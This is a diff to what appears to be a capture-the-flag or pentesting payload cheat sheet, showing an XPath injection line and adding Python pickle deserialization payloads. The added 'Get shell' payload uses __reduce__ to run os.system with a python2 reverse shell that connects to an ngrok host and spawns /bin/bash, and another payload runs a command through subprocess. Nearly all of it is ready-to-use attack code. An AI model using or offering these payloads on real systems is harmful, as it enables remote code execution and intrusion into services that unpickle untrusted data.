@@ -76,6 +76,7 @@ a' or (substring((//flag)[1], 1, 1)) = 'a
 
 ### Python pickle
 
+- **RCE**
 ```python
 import pickle, base64
 
@@ -84,8 +85,16 @@ class DillPickle:
     import subprocess
     return (subprocess.check_output, (['/bin/cat', '/ls'],))
 
-p = pickle.dumps(DillPickle())
-print(base64.b64encode(p).decode('ASCII'))
+print(base64.b64encode(pickle.dumps(DillPickle())).decode())
+```
+
+- **Get shell**
+```python
+class RCE(object):
+  def __reduce__(self):
+    return (os.system,('''python2 -c 'import os,pty,socket;s=socket.socket();s.connect(("0.tcp.jp.ngrok.io",13180));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")' ''',))
+
+p = base64.b64encode(pickle.dumps(RCE())).decode()
 ```
 
 ### Imagemagick
